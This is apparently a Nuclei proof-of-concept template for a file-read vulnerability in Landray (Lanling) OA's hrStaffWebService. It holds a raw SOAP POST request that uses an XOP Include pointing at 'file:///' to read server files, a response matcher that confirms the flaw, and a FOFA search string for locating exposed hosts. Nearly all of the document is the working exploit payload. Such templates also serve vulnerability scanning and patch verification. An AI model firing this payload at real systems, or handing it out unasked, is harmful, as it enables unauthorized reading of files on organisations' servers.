poc_all/web/lanling-oa-hrstaffwebservice-fileread_1.yaml

http:
- matchers:
  - dsl:
    - status_code==500 && contains_all(body,"<faultstring>") && contains_all(body,"Unmarshalling
      Error")
    type: dsl
  raw:
  - "POST /sys/webservice/hrStaffWebService HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ multipart/related; boundary=----{{boundary}}\nSOAPAction: \"\"\n\n------{{boundary}}\n\
    Content-Disposition: form-data; name=\"a\"\n\n<soapenv:Envelope xmlns:soapenv=\"\
    http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.staff.hr.kmss.landray.com/\"\
    >\n<soapenv:Header/>\n<soapenv:Body>\n    <web:getHrStaffElements>\n        <arg0>\n\
    \            <beginTimeStamp>a</beginTimeStamp>\n            <count><xop:Include\
    \ \nxmlns:xop=\"http://www.w3.org/2004/08/xop/include\" \nhref=\"file:///\"/></count>\n\
    \        </arg0>\n    </web:getHrStaffElements>\n</soapenv:Body>\n</soapenv:Envelope>\n\
    ------{{boundary}}--\n"
id: lanling-oa-hrstaffwebservice-fileread
info:
  author: PokerSec
  metadata:
    fofasearch: body="Com_Parameter"
  name: lanling-oa-hrstaffwebservice-fileread
  severity: high
variables:
  boundary: '{{to_lower(rand_base(20))}}'
